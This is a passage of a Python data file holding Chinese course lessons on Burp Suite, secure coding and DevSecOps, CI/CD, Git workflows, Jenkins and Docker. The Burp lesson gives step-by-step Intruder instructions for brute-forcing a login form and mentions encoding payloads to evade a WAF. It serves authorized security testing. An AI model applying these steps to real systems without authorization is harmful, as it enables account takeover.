Payload类型：Simple List(自定义)、Numbers(数字范围)、Dates(日期范围)、Brute Forcer(暴力枚举)、Username Generator(用户名生成)。

实战步骤：
```
1. 拦截登录请求→Send to Intruder
2. 设置攻击位置：username=§admin§&password=§password§
3. Attack Type: Cluster Bomb
4. Payload 1: 用户名列表, Payload 2: 密码字典
5. Grep-Match筛选响应差异
6. Start Attack
```

### Scanner（Pro版）

主动扫描(发送恶意请求，可能副作用)/被动扫描(仅分析流量)。可检测SQL注入、XSS、XXE、SSRF、路径遍历、信息泄露、CSRF、会话管理等。

### Decoder

支持URL编解码、Base64、HTML编码、Hex/Octal/Binary、Gzip、各种Hash、智能解码(自动识别编码)。典型用途：对Payload多层编码绕过WAF。

## 三、实战测试流程

```
1. 配置代理→浏览目标网站→建立站点地图
2. 查看Site map了解站点结构
3. Spider爬虫补充站点地图
4. 逐个检查输入点(表单/URL/上传)
5. 可疑输入点→Repeater手工验证
6. 自动化场景→Intruder批量攻击
7. Pro版Scanner自动扫描
8. 记录漏洞和复现步骤
9. 导出报告
```

## 四、常用技巧

### Match and Replace

Proxy→Options→Match and Replace，自动替换认证Token：
```
Replace: Authorization: Bearer .*
With: Authorization: Bearer YOUR_TEST_TOKEN
```

### Macros（宏）

处理复杂认证流程(OAuth等)：
```
1. GET /login → 获取CSRF Token
2. POST /login → 获取Session
3. GET /dashboard → 确认登录
设置Session Handling Rules自动执行
```

### 推荐BApp插件

Autorize(自动化权限测试)、JSON Web Tokens(JWT解析攻击)、SQLiPy(SQL注入辅助)、Retire.js(前端JS库漏洞)、ActiveScan++(增强扫描)。

## 五、Burp Suite检查清单

- [ ] 浏览器代理配置正确(127.0.0.1:8080)
- [ ] HTTPS证书已安装
- [ ] 目标站点地图已建立
- [ ] 所有输入点已识别(参数/Header/Cookie/文件上传)
- [ ] 高危漏洞手工验证(SQLi/XSS/文件上传)
- [ ] 权限控制测试(水平/垂直越权)
- [ ] 会话管理测试(Cookie属性/固定/超时)
- [ ] 业务逻辑漏洞测试(支付/优惠券/并发)
- [ ] 敏感信息泄露检查
- [ ] 扫描报告已生成保存

> **小结**：Burp Suite是安全测试的"瑞士军刀"。掌握Proxy+Repeater+Intruder三大核心模块，足以应对大多数Web安全测试场景。工具是辅助，真正的能力来自于对漏洞原理的深刻理解。""",
    },
    {
        "title": "第8节：安全编码规范与DevSecOps",
        "sort_order": 8,
        "knowledge_point": "安全编码与DevSecOps",
        "time_estimate": 35,
        "content": """## 安全编码规范与DevSecOps

传统的安全流程是"开发→测试→上线→安全扫描"的串行模式，DevSecOps将安全融入DevOps每一个环节，实现"安全左移"和"安全内置"。

## 一、DevSecOps核心理念

```
传统模式：计划→编码→构建→测试→发布→部署→安全扫描（最后一刻，问题发现太晚！）

DevSecOps模式：计划→编码→构建→测试→发布→部署→运行
                  │     │     │     │     │     │     │
                  ▼     ▼     ▼     ▼     ▼     ▼     ▼
               威胁  IDE安全  SCA  SAST+  镜像  配置  RASP+
               建模  插件    扫描  DAST  扫描  基线  监控
```

## 二、安全编码规范TOP 10

### 1. 输入验证

```python
from pydantic import BaseModel, validator, constr

class CreateUserRequest(BaseModel):
    username: constr(min_length=3, max_length=20, regex=r'^[a-zA-Z0-9_]+$')
    email: constr(regex=r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$')
    age: int
    @validator('age')
    def validate_age(cls, v):
        if v < 0 or v > 150: raise ValueError('年龄无效')
        return v
```

### 2. 输出编码

```python
from markupsafe import escape
safe_username = escape(username)  # HTML实体编码
# React/Vue自动转义：<div>{userInput}</div> ✅ 安全
```

### 3. 密码存储

```python
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hashed)  # 恒定时间比较
# ❌ MD5/SHA256无盐/明文存储
```

### 4. SQL操作

```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # ✅ 参数化
user = session.query(User).filter(User.id == user_id).first()    # ✅ ORM
# ❌ cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 5. 访问控制

```python
@app.get('/api/admin/users')
@require_role('admin')
def list_users(current_user):
    return UserService.get_all_users()

@app.get('/api/orders/{order_id}')
def get_order(order_id: int, current_user):
    order = OrderService.get_by_id(order_id)
    if order.user_id != current_user.id:
        raise HTTPException(status_code=403)  # 水平越权防护
    return order
```

### 6. 文件操作

```python
import os
def safe_file_read(filename, base_dir='/var/app/data/'):
    safe_path = os.path.normpath(os.path.join(base_dir, filename))
    if not safe_path.startswith(os.path.normpath(base_dir)):
        raise ValueError('非法路径')  # 防路径遍历
    return open(safe_path).read()
```

### 7. 密钥管理

```python
import os
ENCRYPTION_KEY = os.environ.get('APP_ENCRYPTION_KEY')  # 环境变量
if not ENCRYPTION_KEY: raise RuntimeError
# ❌ SECRET_KEY = "hardcoded-key"  # 禁止硬编码！
```

### 8. 日志安全

```python
logger.info(f"用户登录: username={username}")      # ✅
# ❌ logger.info(f"password={password}")           # 禁止记录密码
# ❌ logger.info(f"Token: {access_token}")         # 禁止记录Token
```

### 9. 错误处理

```python
@app.exception_handler(Exception)
async def global_exception_handler(request, exc):
    logger.error(f"Internal error: {exc}", exc_info=True)
    return JSONResponse(status_code=500,
        content={"message": "服务器内部错误"})  # 不暴露traceback
```

### 10. 依赖管理

```bash
pip-audit        # Python依赖审计
npm audit        # Node.js依赖审计
# CI/CD集成
security_scan:
  script:
    - pip-audit --strict
    - bandit -r src/
```

## 三、DevSecOps工具链

| 阶段 | 安全活动 | 工具 | 集成方式 |
|------|----------|------|----------|
| 编码 | IDE安全插件 | SonarLint/Snyk Code | IDE Plugin |
| 构建 | SCA/SAST | Snyk/SonarQube/Bandit | CI/CD Pipeline |
| 测试 | DAST/IAST | OWASP ZAP/Burp Suite | CI/CD Pipeline |
| 部署 | 镜像扫描/配置基线 | Trivy/Clair/Checkov | Registry Hook |
| 运行 | RASP/WAF/监控 | ModSecurity/Falco | Agent/DaemonSet |

## 四、DevSecOps实施路线图

```
Phase 1(1-3月): 安全编码规范/IDE插件/SCA接入CI/CD/安全培训
Phase 2(3-6月): SAST接入CI/CD/DAST定期扫描/容器镜像扫描/安全Champion制度
Phase 3(6月+): 安全指标看板/SOAR/威胁建模常态化/红蓝对抗
```

## 五、DevSecOps检查清单

**组织**：安全编码规范文档、安全培训、安全Champion、漏洞响应SLA(P0=24h)。

**工具**：IDE SonarLint/Snyk Code、CI/CD SAST(SonarQube/Semgrep)、CI/CD SCA、定期DAST(OWASP ZAP)、容器镜像扫描、K8s合规检查。

**流程**：代码审查含安全检查、PR不通过安全门禁不合入、发布前安全签核、生产环境WAF/RASP、安全事件监控告警。

> **小结**：DevSecOps的核心转变——安全不再是流程最后的"守门员"，而是贯穿始终的"护航员"。""",
    },
]

# ============================================================
# 路径15: 持续集成与DevOps
# ============================================================
LESSON_CONTENT_4["持续集成与DevOps"] = [
    {
        "title": "第1节：CI/CD核心概念与工具链选型",
        "sort_order": 1,
        "knowledge_point": "CI/CD概念",
        "time_estimate": 30,
        "content": """## CI/CD核心概念与工具链选型

CI/CD是现代软件开发的核心实践，通过自动化构建、测试和部署流程，实现快速、高质量、可靠的软件交付。

## 一、CI/CD核心概念

### 持续集成 (CI)

开发人员频繁将代码合并到主干，每次合并触发自动化构建和测试，尽早发现集成问题。

```
代码提交→代码检出→编译→静态分析→单元测试→打包→生成制品→通过/失败
```

### 持续交付 (CD)

在CI基础上确保代码随时可部署到生产。**需要人工确认才能部署**。

### 持续部署 (CD)

与持续交付的区别是**无需人工干预**，通过所有自动化测试后自动部署到生产。

```
持续交付：CI → 自动部署到测试/预发布 → [人工确认] → 生产部署
持续部署：CI → 自动部署到测试 → 自动部署到预发布 → 自动部署到生产
```

## 二、CI/CD工具链对比

| 工具 | 类型 | 优势 | 劣势 | 适用场景 |
|------|------|------|------|----------|
| Jenkins | 自托管 | 灵活、插件丰富 | 维护成本高 | 自定义需求多的企业 |
| GitLab CI | 集成平台 | 与GitLab深度集成 | 仅限GitLab | GitLab用户 |
| GitHub Actions | SaaS | 与GitHub集成 | 仅限GitHub | 开源项目 |
| CircleCI | SaaS/自托管 | 速度快 | 价格较高 | 初创企业 |
| Travis CI | SaaS | 简单易用 | 功能有限 | 简单项目 |
| Tekton | K8s原生 | 云原生 | 配置复杂 | K8s环境 |

### 选型建议矩阵

| 场景 | 推荐工具 |
|------|----------|
| 代码在GitLab | GitLab CI |
| 代码在GitHub | GitHub Actions |
| 需要高度自定义 | Jenkins |
| K8s云原生 | Tekton/ArgoCD |
| 测试团队CI/CD | Jenkins + 测试框架集成 |

## 三、CI/CD Pipeline典型结构

```
┌─────────────────────────────────────────────────────────────┐
│                      CI/CD Pipeline                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  [触发] 代码Push / PR / 定时 / 手动                          │
│     │                                                       │
│     ▼                                                       │
│  [Stage 1: 构建]                                             │
│  ├── Checkout代码                                            │
│  ├── 安装依赖 (npm install / pip install)                    │
│  ├── 静态代码分析 (ESLint / Pylint / SonarQube)             │
│  └── 编译打包 (docker build / mvn package)                   │
│     │                                                       │
│     ▼                                                       │
│  [Stage 2: 测试]                                             │
│  ├── 单元测试 (Jest / pytest / JUnit)                        │
│  ├── 集成测试                                                │
│  ├── 代码覆盖率检查 (≥80%)                                   │
│  └── 安全扫描 (SAST + SCA)                                   │
│     │                                                       │
│     ▼                                                       │
│  [Stage 3: 部署到测试环境]                                    │
│  ├── Docker Push 镜像                                        │
│  ├── K8s Apply / Docker Compose Up                          │
│  └── 冒烟测试验证                                            │
│     │                                                       │
│     ▼                                                       │
│  [Stage 4: 部署到生产环境] (持续交付需手动触发)               │
│  ├── 蓝绿部署 / 金丝雀发布                                   │
│  ├── 健康检查                                                │
│  └── 回滚机制就绪                                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## 四、CI/CD最佳实践

| 实践 | 说明 | 收益 |
|------|------|------|
| 主干开发 | 代码频繁合并主干，分支存活<1天 | 减少合并冲突 |
| 快速构建 | CI构建<10分钟 | 快速反馈 |
| 质量门禁 | 测试覆盖率/SAST/SCA不通过则阻断 | 保证质量 |
| 一次构建多次部署 | 同一制品从测试到生产 | 环境一致性 |
| 不可变基础设施 | 镜像而非手动配置 | 可重复、可追溯 |
| Feature Flag | 功能开关控制发布 | 解耦部署与发布 |
| 监控告警 | 部署后自动监控 | 快速发现问题 |

### Pipeline即代码（Pipeline as Code）

所有CI/CD配置以代码形式存储在版本库中，纳入代码审查流程，确保Pipeline的一致性和可追溯性。

### CI/CD检查清单

- [ ] 配置了代码提交自动触发CI
- [ ] Pipeline中有静态代码分析步骤
- [ ] Pipeline中有单元测试步骤
- [ ] Pipeline中有安全扫描步骤
- [ ] Pipeline中有代码覆盖率检查
- [ ] 部署流水线已配置自动回滚
- [ ] 生产部署需要人工审批（持续交付）
- [ ] Pipeline运行时间<15分钟
- [ ] Pipeline配置文件在版本管理中

> **小结**：CI/CD是现代软件工程的基石。核心要素：自动化、快速反馈、质量门禁、环境一致性。""",
    },
    {
        "title": "第2节：Git工作流与分支策略(GitFlow/Trunk-Based)",
        "sort_order": 2,
        "knowledge_point": "Git工作流",
        "time_estimate": 30,
        "content": """## Git工作流与分支策略

分支策略直接影响团队的协作效率、代码质量和发布节奏。选择合适的分支模型是DevOps实践的基础。

## 一、GitFlow分支模型

GitFlow是经典的、重型的分支模型，适合有固定发布周期的传统软件开发。

### 分支结构

```
master (生产)
  │
  ├── develop (开发主线)
  │     │
  │     ├── feature/xxx (功能分支，从develop分出，合并回develop)
  │     │
  │     └── release/v1.0 (发布分支，从develop分出，合并到master和develop)
  │
  └── hotfix/xxx (热修复分支，从master分出，合并到master和develop)
```

### 各分支职责

| 分支 | 来源 | 合并目标 | 命名规范 | 生命周期 |
|------|------|----------|----------|----------|
| master | - | - | master | 永久 |
| develop | master | - | develop | 永久 |
| feature | develop | develop | feature/功能描述 | 开发期间 |
| release | develop | master+develop | release/v1.2.0 | 发布准备期 |
| hotfix | master | master+develop | hotfix/问题描述 | 修复期间 |

### GitFlow操作流程

```bash
# 功能开发
git checkout -b feature/user-login develop
git add . && git commit -m "feat: 用户登录功能"
git checkout develop && git merge --no-ff feature/user-login

# 发布流程
git checkout -b release/v1.0.0 develop
# 修复bug、更新版本号
git checkout master && git merge --no-ff release/v1.0.0
git tag -a v1.0.0 -m "Release v1.0.0"
git checkout develop && git merge --no-ff release/v1.0.0
git branch -d release/v1.0.0

# 热修复
git checkout -b hotfix/login-bug master
# 修复bug
git checkout master && git merge --no-ff hotfix/login-bug
git tag -a v1.0.1 -m "Hotfix v1.0.1"
git checkout develop && git merge --no-ff hotfix/login-bug
```

### GitFlow优缺点

| 优点 | 缺点 |
|------|------|
| 结构清晰、职责分明 | 分支多、合并复杂 |
| 适合多个并行版本维护 | 不适合频繁发布 |
| 发布流程规范严格 | CI/CD集成困难 |

## 二、Trunk-Based Development (主干开发)

主干开发是现代化的轻量级分支策略，所有开发人员直接在主干（trunk/main）上协作，通过短生命周期的分支和频繁提交来保持代码健康。

### 分支结构

```
main (唯一长期分支)
  │
  ├── 开发者直接提交(小改动)
  │
  └── short-lived feature branch (< 1天)
        └── 快速合并回main
```

### 核心原则

| 原则 | 说明 |
|------|------|
| 单一主干 | 只有一个长期分支(main/master) |
| 短分支 | 功能分支存活<1天 |
| 频繁合并 | 每天至少合并一次到主干 |
| 小批次提交 | 每次提交改动量小 |
| Feature Flag | 通过功能开关控制未完成功能的可见性 |

### Trunk-Based操作流程

```bash
# 小改动：直接在主干开发
git checkout main && git pull
# 改代码 → 测试 → 提交
git add . && git commit -m "refactor: 优化查询性能"
git push

# 稍大改动：短分支 (<1天)
git checkout -b feature/order-search main
# 开发、多次提交
git add . && git commit -m "feat: 订单搜索功能"
git checkout main && git pull
git merge feature/order-search
git push && git branch -d feature/order-search
```

### Feature Flag实现渐进式交付

```python
# Python示例
from UnleashClient import UnleashClient

client = UnleashClient("https://unleash.example.com", "my-app")

@app.get("/api/orders/search")
def search_orders():
    if client.is_enabled("new-search-engine"):
        return new_search_service.search()  # 新功能（仅部分用户可见）
    else:
        return legacy_search_service.search()  # 旧功能
```

## 三、GitFlow vs Trunk-Based

| 维度 | GitFlow | Trunk-Based |
|------|---------|-------------|
| 分支数量 | 多（6种类型） | 少（1个主干+短分支） |
| 合并复杂度 | 高 | 低 |
| 发布频率 | 低频（周/月） | 高频（天/小时） |
| 适合团队 | 传统企业软件 | 互联网/SaaS/微服务 |
| CI/CD适配 | 困难 | 天然适配 |
| 代码审查 | MR到develop | MR到main |
| 版本管理 | Tag+Release分支 | Tag |

## 四、提交规范

### Conventional Commits

```
<type>(<scope>): <description>

[optional body]

[optional footer(s)]

类型(scope必填):
feat:     新功能
fix:      修复bug
docs:     文档变更
style:    代码格式
refactor: 重构
test:     测试相关
chore:    构建/工具变更
```

示例：
```
feat(order): 添加订单批量导出功能
fix(auth): 修复Token过期后未跳转登录页的问题
test(api): 增加订单接口集成测试用例
```

### 代码审查检查清单

- [ ] 代码逻辑是否正确，是否覆盖了边界情况
- [ ] 是否有单元测试/集成测试
- [ ] 是否遵循了团队的编码规范
- [ ] 是否有硬编码的敏感信息
- [ ] SQL操作是否使用了参数化查询
- [ ] 是否考虑了性能影响
- [ ] 提交信息是否符合规范

> **小结**：GitFlow适合有固定发布周期的传统团队，Trunk-Based适合追求快速迭代的互联网团队。核心原则：选择适合团队现状的模型，并坚持执行。""",
    },
    {
        "title": "第3节：Jenkins Pipeline详解(Groovy/声明式/脚本式)",
        "sort_order": 3,
        "knowledge_point": "Jenkins Pipeline",
        "time_estimate": 35,
        "content": """## Jenkins Pipeline详解

Jenkins是历史最悠久、使用最广泛的CI/CD工具之一。Jenkins Pipeline是其核心功能，通过代码定义整个CI/CD流程。

## 一、Jenkins Pipeline类型对比

| 特性 | 声明式(Declarative) | 脚本式(Scripted) |
|------|--------------------|-------------------|
| 语法 | 结构化、简洁 | 灵活的Groovy代码 |
| 学习成本 | 低 | 高 |
| 代码复用 | 有限 | 高度复用 |
| 错误处理 | 内置post块 | 需要try-catch |
| 推荐场景 | 大多数CI/CD场景 | 复杂逻辑/高度定制 |

声明式Pipeline结构：
```groovy
pipeline {
    agent any                              // 执行节点
    environment { ... }                    // 环境变量
    parameters { ... }                     // 输入参数
    tools { ... }                          // 工具定义
    triggers { ... }                       // 触发器
    stages {
        stage('构建') {
            steps { ... }                  // 执行步骤
        }
        stage('测试') {
            steps { ... }
        }
    }
    post {                                 // 后置操作
        always { ... }
        success { ... }
        failure { ... }
    }
}
```

## 二、声明式Pipeline实战

### 完整的CI/CD Pipeline

```groovy
pipeline {
    agent {
        docker {
            image 'python:3.10'
            args '-v /var/run/docker.sock:/var/run/docker.sock'
        }
    }

    environment {
        DOCKER_REGISTRY = 'registry.example.com'
        IMAGE_NAME = 'myapp'
        IMAGE_TAG = "${BUILD_NUMBER}"
        SONAR_HOST = 'http://sonarqube:9000'
    }

    parameters {
        choice(name: 'ENVIRONMENT', choices: ['staging', 'production'], description: '部署环境')
        booleanParam(name: 'RUN_PERFORMANCE_TEST', defaultValue: false, description: '是否执行性能测试')
    }

    stages {
        stage('代码检出') {
            steps {
                checkout scm
                echo "正在构建分支: ${env.BRANCH_NAME}, Commit: ${env.GIT_COMMIT}"
            }
        }

        stage('环境准备') {
            steps {
                sh 'pip install -r requirements.txt'
                sh 'pip install pytest pytest-cov bandit'
            }
        }

        stage('代码质量检查') {
            parallel {
                stage('Lint检查') { steps { sh 'flake8 src/ --max-line-length=120' } }
                stage('类型检查') { steps { sh 'mypy src/' } }
                stage('安全扫描') { steps { sh 'bandit -r src/ -f json -o bandit-report.json' } }
                stage('依赖扫描') { steps { sh 'pip-audit' } }
            }
            post {
                always {
                    recordIssues(tools: [flake8()])
                    archiveArtifacts artifacts: 'bandit-report.json'
                }
            }
        }

        stage('单元测试') {
            steps {
                sh 'pytest tests/ --junitxml=test-results.xml --cov=src --cov-report=xml --cov-report=html'
            }
            post {
                always {
                    junit 'test-results.xml'
                    publishCoverage(adapters: [cobertura('coverage.xml')])
                }
            }
        }

        stage('质量门禁') {
            steps {
                script {
                    def coverage = readFile('coverage.txt').trim().toFloat()
                    if (coverage < 80.0) {
                        error("代码覆盖率 ${coverage}% 低于80%门禁，构建失败!")
                    }
                }
            }
        }

        stage('构建Docker镜像') {
            steps {
                sh '''
                    docker build -t ${DOCKER_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} .
                    docker tag ${DOCKER_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} ${DOCKER_REGISTRY}/${IMAGE_NAME}:latest
                '''
            }
        }

        stage('推送镜像') {
            when { expression { currentBuild.resultIsBetterOrEqualTo('SUCCESS') } }
            steps {
                sh 'docker push ${DOCKER_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}'
            }
        }

        stage('部署到测试环境') {
            when { expression { params.ENVIRONMENT == 'staging' } }
            steps {
                sh 'kubectl set image deployment/myapp myapp=${DOCKER_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} -n staging'
                sh 'kubectl rollout status deployment/myapp -n staging --timeout=120s'
            }
        }

        stage('冒烟测试') {
            steps {
                sh 'pytest tests/smoke/ -v'
            }
        }

        stage('性能测试') {
            when { expression { params.RUN_PERFORMANCE_TEST } }
            steps {
                sh 'locust -f locustfile.py --headless --users 100 --run-time 5m --csv=results/perf'
            }
        }

        stage('生产部署') {
            when { expression { params.ENVIRONMENT == 'production' } }
            input { message '确认部署到生产环境？' }
            steps {
                sh 'kubectl set image deployment/myapp myapp=${DOCKER_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} -n production'
            }
        }
    }

    post {
        always {
            cleanWs()  // 清理工作区
            emailext(
                subject: "Pipeline ${currentBuild.fullDisplayName}",
                body: "构建结果: ${currentBuild.result}\n日志: ${env.BUILD_URL}",
                to: 'dev-team@example.com'
            )
        }
        failure {
            // 发送告警到钉钉/飞书
            sh 'python notify.py --status=failure --pipeline=${JOB_NAME} --build=${BUILD_NUMBER}'
        }
        success {
            sh 'python notify.py --status=success --pipeline=${JOB_NAME} --build=${BUILD_NUMBER}'
        }
    }
}
```

## 三、脚本式Pipeline高级用法

```groovy
def buildImage(String dockerfile, String tag) {
    docker.build("myapp:${tag}", "-f ${dockerfile} .")
}

def runParallelTests() {
    parallel(
        '单元测试': { sh 'pytest tests/unit/' },
        '集成测试': { sh 'pytest tests/integration/' },
        'E2E测试': { sh 'pytest tests/e2e/' }
    )
}

node('docker') {
    try {
        stage('构建') {
            checkout scm
            buildImage('Dockerfile', env.BUILD_NUMBER)
        }
        stage('测试') { runParallelTests() }
        stage('部署') {
            if (env.BRANCH_NAME == 'main') {
                input message: '确认部署到生产环境？'
                sh "docker push myapp:${env.BUILD_NUMBER}"
            }
        }
    } catch (err) {
        currentBuild.result = 'FAILURE'
        throw err
    } finally {
        cleanWs()
    }
}
```

## 四、Jenkins与测试集成

### 测试框架集成

| 测试框架 | Jenkins插件 | 报告集成方式 |
|----------|------------|-------------|
| JUnit/TestNG | JUnit Plugin | `junit '**/test-results/*.xml'` |
| pytest | JUnit Plugin | `--junitxml=results.xml` + `junit` |
| JMeter | Performance Plugin | `perfReport` 步骤 |
| Selenium | HTML Publisher | `publishHTML` |
| SonarQube | SonarQube Scanner | `withSonarQubeEnv` |

### 测试报告发布示例

```groovy
stage('测试报告汇总') {
    steps {
        script {
            // JUnit测试报告
            junit testResults: '**/test-results/*.xml', allowEmptyResults: true

            // 覆盖率报告
            publishCoverage(adapters: [cobertura('**/coverage.xml')])

            // HTML报告
            publishHTML(target: [
                reportName: 'API测试报告',
                reportDir: 'reports/api-test',
                reportFiles: 'index.html',
                keepAll: true
            ])

            // JMeter性能报告
            perfReport filterRegex: '', sourceDataFiles: '**/*.jtl'
        }
    }
}
```

## 五、Jenkins最佳实践

| 实践 | 说明 |
|------|------|
| Pipeline as Code | Pipeline定义在Jenkinsfile中，纳入版本管理 |
| 共享库 | 提取公共逻辑到Shared Library |
| 凭证管理 | 使用Credentials插件，不要硬编码密钥 |
| 并发限制 | 使用lock/milestone控制并发构建 |
| 超时控制 | 每个stage设置合理timeout |
| 制品归档 | 使用archiveArtifacts保存重要输出 |
| 日志清理 | 配置构建日志保留策略 |
| Master/Agent分离 | Master只做调度，Agent执行任务 |

> **小结**：声明式Pipeline适合大多数场景，脚本式Pipeline适合高度定制场景。Pipeline as Code是Jenkins使用的最佳实践，将构建流程版本化、可审查、可复用。""",
    },
    {
        "title": "第4节：Docker容器化与Docker Compose编排",
        "sort_order": 4,
        "knowledge_point": "Docker容器化",
        "time_estimate": 35,
        "content": """## Docker容器化与Docker Compose编排

Docker已成为CI/CD和微服务架构的事实标准。掌握Docker的使用是测试工程师在DevOps时代的必备技能。

## 一、Docker核心概念

```
┌─────────────────────────────────────────┐
│         Registry (镜像仓库)              │
│     Docker Hub / Harbor / ECR           │
│  ┌─────┐ ┌─────┐ ┌─────┐              │
│  │镜像1│ │镜像2│ │镜像3│              │
│  └──┬──┘ └──┬──┘ └──┬──┘              │
└─────┼───────┼───────┼──────────────────┘
      │ pull  │       │
      ▼       ▼       ▼
┌─────────────────────────────────────────┐
│          Docker Host                     │
│  ┌─────────┐ ┌─────────┐ ┌─────────┐  │
│  │容器A     │ │容器B     │ │容器C     │  │
│  │(运行中)  │ │(运行中)  │ │(停止)    │  │
│  └─────────┘ └─────────┘ └─────────┘  │
└─────────────────────────────────────────┘
```

| 概念 | 比喻 | 说明 |
|------|------|------|
| 镜像(Image) | 类(Class) | 容器的模板，只读 |
| 容器(Container) | 实例(Object) | 镜像的运行实例 |
| Dockerfile | 菜谱 | 构建镜像的指令文件 |
| Registry | 菜谱库 | 存储和分发镜像 |
| Volume | 数据盘 | 持久化存储 |
| Network | 局域网 | 容器间通信网络 |

## 二、Dockerfile最佳实践

### 多阶段构建（推荐）

```dockerfile
# ============ 构建阶段 ============
FROM python:3.10-slim AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

# ============ 运行阶段 ============
FROM python:3.10-slim

WORKDIR /app
COPY --from=builder /root/.local /root/.local
COPY . .

ENV PATH=/root/.local/bin:$PATH
ENV PYTHONUNBUFFERED=1

USER 1000:1000
EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
    CMD curl -f http://localhost:8000/health || exit 1

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Dockerfile最佳实践

| 实践 | 说明 |
|------|------|
| 多阶段构建 | 分离构建和运行，减小镜像体积 |
| 使用官方基础镜像 | 安全、维护性好 |
| 合并RUN指令 | 减少镜像层数 |
| 非root用户运行 | USER指令安全实践 |
| .dockerignore | 排除不需要的文件 |
| HEALTHCHECK | 容器健康检查 |
| COPY优于ADD | COPY更透明 |
| 减少层缓存失效 | 将不常变的放在前面 |

## 三、Docker Compose编排

### 测试环境一键启动

```yaml
version: '3.8'
services:
  postgres:
    image: postgres:15-alpine
    container_name: test-postgres
    environment:
      POSTGRES_DB: testdb
      POSTGRES_USER: testuser
      POSTGRES_PASSWORD: testpass
    ports: ["5432:5432"]
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./init-scripts:/docker-entrypoint-initdb.d
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U testuser -d testdb"]
      interval: 10s; timeout: 5s; retries: 5

  redis:
    image: redis:7-alpine
    container_name: test-redis
    ports: ["6379:6379"]
    command: redis-server --appendonly yes

  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile
    container_name: test-backend
    ports: ["8000:8000"]
    environment:
      DATABASE_URL: postgresql://testuser:testpass@postgres:5432/testdb
      REDIS_URL: redis://redis:6379/0
    depends_on:
      postgres: { condition: service_healthy }
      redis: { condition: service_started }
    volumes:
      - ./backend:/app:ro
    command: uvicorn main:app --host 0.0.0.0 --port 8000 --reload

  frontend:
    build:
      context: ./frontend
      dockerfile: Dockerfile
    container_name: test-frontend
    ports: ["3000:3000"]
    environment:
      VITE_API_BASE_URL: http://localhost:8000
    depends_on: [backend]
    volumes:
      - ./frontend/src:/app/src

  selenium-hub:
    image: selenium/hub:4.16
    container_name: selenium-hub
    ports: ["4444:4444"]

  chrome:
    image: selenium/node-chrome:4.16
    depends_on: [selenium-hub]
    environment:
      SE_EVENT_BUS_HOST: selenium-hub
      SE_EVENT_BUS_PUBLISH_PORT: 4442
      SE_EVENT_BUS_SUBSCRIBE_PORT: 4443

volumes:
  postgres_data:
```

### 测试执行命令

```bash
# 启动测试环境
docker compose -f docker-compose.test.yml up -d

# 等待服务就绪
docker compose -f docker-compose.test.yml exec backend \
    sh -c "until curl -s http://localhost:8000/health; do sleep 2; done"

# 执行测试
docker compose -f docker-compose.test.yml exec backend \
    pytest tests/ -v --cov=src --cov-report=html

# 清理环境
docker compose -f docker-compose.test.yml down -v
```

### 常用Docker Compose命令

| 命令 | 用途 |
|------|------|
| `docker compose up -d` | 后台启动所有服务 |
| `docker compose up --build` | 重新构建并启动 |
| `docker compose down` | 停止并删除容器 |
| `docker compose down -v` | 停止并删除容器+数据卷 |
| `docker compose logs -f [service]` | 查看服务日志 |
| `docker compose exec [svc] [cmd]` | 在服务容器中执行命令 |
| `docker compose ps` | 查看所有服务状态 |
| `docker compose restart [svc]` | 重启服务 |

## 四、测试中的Docker应用

### 集成测试示例

```python
# conftest.py - pytest fixtures
import pytest
import docker
from sqlalchemy import create_engine

@pytest.fixture(scope="session")
def docker_client():
    return docker.from_env()

@pytest.fixture(scope="session")
def postgres_container(docker_client):
    container = docker_client.containers.run(
        "postgres:15-alpine",
        environment={"POSTGRES_DB":"test","POSTGRES_PASSWORD":"test"},
        ports={"5432/tcp": None},
        detach=True, remove=True
    )
    # 等待就绪
    time.sleep(3)
    yield container
    container.stop()

@pytest.fixture(scope="function")
def db_session(postgres_container):
    port = postgres_container.attrs['NetworkSettings']['Ports']['5432/tcp'][0]['HostPort']
    url = f"postgresql://postgres:test@localhost:{port}/test"
    engine = create_engine(url)
    Base.metadata.create_all(engine)
    session = Session(bind=engine)
    yield session
    session.close()
    Base.metadata.drop_all(engine)
```

## 五、Docker安全检查清单

- [ ] 使用官方基础镜像或经过验证的镜像
- [ ] 避免以root用户运行容器
- [ ] 不在Dockerfile中硬编码密钥
- [ ] 定期更新基础镜像版本
- [ ] 使用多阶段构建减小攻击面
- [ ] 限制容器资源（CPU/内存）
- [ ] 镜像扫描（Trivy/Clair）集成到CI/CD
- [ ] 使用只读文件系统(`read_only: true`)
- [ ] 设置SELinux/AppArmor安全策略

> **小结**：Docker让环境一致性成为可能，"在我的机器上能跑"不再是问题。测试环境一键启动是Docker在测试中最直接的价值体现。""",
    },
    {
        "title": "第5节：GitLab CI/CD配置与实战",
        "sort_order": 5,
        "knowledge_point": "GitLab CI/CD",
        "time_estimate": 35,
        "content": """## GitLab CI/CD配置与实战

GitLab CI/CD是GitLab内置的CI/CD平台，通过`.gitlab-ci.yml`文件定义Pipeline，与GitLab代码仓库深度集成。

## 一、核心概念

```
┌──────────────────────────────────────────────────────┐
│                   GitLab CI/CD 架构                    │
├──────────────────────────────────────────────────────┤
│                                                       │
│  Pipeline (流水线)                                     │
│  ├── Stage 1: Build                                  │
│  │   └── Job 1: compile (Runner A)                   │
│  ├── Stage 2: Test                                   │
│  │   ├── Job 2: unit-test (Runner B)                 │
│  │   └── Job 3: integration-test (Runner C)          │
│  ├── Stage 3: Deploy                                 │
│  │   └── Job 4: deploy-staging (Runner D)            │
│  └── Stage 4: Verify                                 │
│      └── Job 5: smoke-test (Runner E)                │
│                                                       │
